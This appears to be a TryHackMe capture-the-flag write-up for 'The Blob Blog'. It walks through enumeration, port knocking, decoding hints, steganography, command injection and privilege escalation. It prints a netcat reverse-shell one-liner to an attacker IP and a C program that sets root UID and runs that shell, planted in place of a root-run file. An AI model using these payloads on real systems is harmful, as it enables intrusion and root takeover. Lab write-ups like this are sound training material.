---
title: The-Blob-Blog TryHackMe Writeup
tags: [writeup,rest,python,tryhackme,linux,api,suid]
style: border
color: success
description: ""
---


![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/1.png)

## Scanning
We scan with **nmap** all ports with scripts and versions.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/2.png)

## Enumeration
We access the website, we find the default Apache Ubuntu page. 

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/3.png)

We find in the source code a text encoded in "*base64*".

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/4.png)

We decode the text and get as a result another one, this time it is encoded in "*brainfuck*".

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/5.png)

We decode the text, it seems to give us a "*hint*" to perform port knocking and discover some new service.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/6.png)

We download the **[knock](https://github.com/grongor/knock)** tool and use the port sequence mentioned in the hint. 
After finishing, we do a new nmap and find two new ports (*21, 8080 and 445*).

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/7.png)

Using **dirsearch** on port *8080 web service*, we found several interesting paths to a blog.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/8.png)

The credentials are tested in the authentication panel, but they do not work. We try to access through the **FTP** service and they do work.

In the **FTP** there is only one *photo* that could contain stego, but there is nothing else interesting (at the moment).

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/9.png)

Again, we launched **nmap** to check software versions of the new ports. We found that *port 445* (normally SMB) is an *HTTP service*!!!!

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/10.png)

We access the web resource through port 445, in the source code we find some credentials.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/11.png)

We launch the **dirsearch** tool again on the new resource and find a directory called *"/user"* which provides us with a private *SSH key*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/12.png)

#### Evidence of SSH Private key

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/13.png)

Now with the previously found password, we extract the text file that contains the previous image, it hides a path and credentials.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/14.png)

We access the web path that hid the text file found, it seems to give us a clue and sign a user.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/15.png)

We tried the credentials, but they do not work. The **hint** left a word at the end of the text, this made me think that maybe they were encoded or encrypted, so I tried with *vigenère* and it worked!

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/16.png)

Enter your credentials and you have access to the blog.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/17.png)

## Exploitation

We see that from the form field we are able to execute system commands.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/18.png)

#### Result

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/19.png)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.30.149 443 >/tmp/f
```
#### Reverse shell

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/20.png)

We do a little reconnaissance, we try *two images* of two puppies, we test to see if they contain any information with **steghide** (without password) and one of them shows us a cipher text.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/21.png)

No comment....

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/22.png)

We tested the passwords found with the two users and one of them works with the user *"bob"*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/23.png)

We found the rare "*blogFeedback*" binary, downloaded it and analyzed it with "**Ghidra**".

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/25.png)

We see that the binary asks for a numerical sequence being less than 7 digits and that it executes a shell with the user *UID/GID 1000:1000 (bobloblaw)*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/26.png)

We put the sequence of the *6 digits less than 7*, we see that we already have shell as the user "*bobloblaw*", we look for the flag and read it.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/27.png)

## Privilege Escalation

We run "*sudo -l*" and we see that we have access to two binaries with *SUDO*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/28.png)

I'm trying to play around with these binaries, but I can't get anything...There is a rather annoying message that keeps popping up on the screen. We launch the **pspy64** tool and see what is running.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/30.png)

``` c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main(int argc, char **argv)
{
setreuid(0,0);
system("/bin/sh rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.30.149 443 >/tmp/f");
return(0);
}
```
We create a file in **C** with our reverse shell, replace it with the legitimate one and wait for it to compile and run on the victim machine... We receive a connection as the *root user* ;)

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/The-Blob-Blog/31.png)




